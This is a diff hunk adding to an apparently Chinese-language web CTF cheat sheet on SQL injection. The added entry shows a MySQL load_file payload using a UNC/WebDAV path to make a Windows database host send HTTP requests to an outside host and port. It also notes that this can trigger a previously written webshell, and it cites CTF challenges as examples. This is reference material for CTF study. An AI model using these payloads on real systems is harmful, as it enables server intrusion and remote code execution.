@@ -1098,6 +1098,12 @@ pop graphic-context
             - [HITCON 2019 - GoGoPowerSQL](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#gogo-powersql)
             - [0CTF 2018 Final - h4x0rs.club](https://l4wio.github.io/CTF-challenges-by-me/0ctf_final-2018/0ctf_tctf_2018_slides.pdf)
             - [VolgaCTF 2018 - Corp Monitoring](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)
+    - load_file with WebDAV
+        - `load_file('//kaibro.tw@9478/meow.php')` / `load_file('\\\\kaibro.tw@9478/meow.php')`
+            - Windows 環境有開 WebClient Service 時，可以透過 MySQL load_file + UNC Path 發送 HTTP Reuqest 到指定 URL (透過 `@` 指定 Port)
+            - 實戰中，站庫分離環境，若後端 MySQL 主機有開 Web 環境，則可透過該方法先寫 webshell 再送 http request 觸發執行
+        - Example
+            - [Balsn CTF 2023 - ginowa](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2023#ginowa)
 - File-write
     - `INTO DUMPFILE`
         - 適用 binary (寫入同一行)
